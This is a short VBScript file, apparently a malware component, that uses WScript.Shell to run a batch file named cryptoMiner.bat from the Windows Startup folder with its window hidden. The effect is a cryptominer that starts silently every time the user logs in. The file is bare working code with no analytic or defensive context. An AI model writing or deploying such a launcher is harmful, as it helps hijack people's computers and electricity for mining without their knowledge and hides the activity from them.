Set WshShell = CreateObject("WScript.Shell" ) 
WshShell.Run chr(34) & "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/cryptoMiner.bat" & Chr(34), 0 
Set WshShell = Nothing